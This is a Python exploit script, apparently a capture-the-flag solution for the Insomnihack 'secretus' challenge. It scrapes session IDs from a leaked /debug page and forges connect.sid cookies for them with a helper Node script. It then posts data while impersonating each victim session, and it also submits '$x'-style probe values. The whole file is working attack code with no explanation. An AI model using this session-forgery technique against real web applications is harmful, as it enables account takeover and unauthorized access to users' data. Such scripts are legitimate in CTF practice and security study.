#!/usr/bin/env python3
import re
import subprocess

import requests

session = requests.Session()

def secrets():
    response = session.get('http://secretus.insomnihack.ch/secret', headers={'Authorization': 'secret'})
    print(response.headers)
    print(response.content)
    response.raise_for_status()

    for i in range(4):
        response = session.post('http://secretus.insomnihack.ch/secret/add', headers={'Authorization': 'secret'}, data={'newsecret': f'$x{i}'})
        print(response.headers)
        print(response.content)
        response.raise_for_status()

response = session.get('http://secretus.insomnihack.ch/debug', headers={'Authorization': 'secret'})
print(response.headers)
print(response.content)
response.raise_for_status()

for session_id in re.findall(br'<li>([^.]+).json</li>', response.content):
    session_id = session_id.decode()
    fake_cookie = subprocess.check_output(['node', 'fake-session.js', session_id], cwd='hello')
    prefix = b'connect.sid='
    suffix = b'\n'
    assert fake_cookie.startswith(prefix)
    assert fake_cookie.endswith(suffix)
    fake_sid = fake_cookie[len(prefix):-len(suffix)]
    session.cookies['connect.sid'] = fake_sid.decode()
    response = session.post('http://secretus.insomnihack.ch/secret/add', headers={'Authorization': 'secret'}, data={'newsecret': f'newsecret'})
    print(response.headers)
    print(response.content)
    #response.raise_for_status()
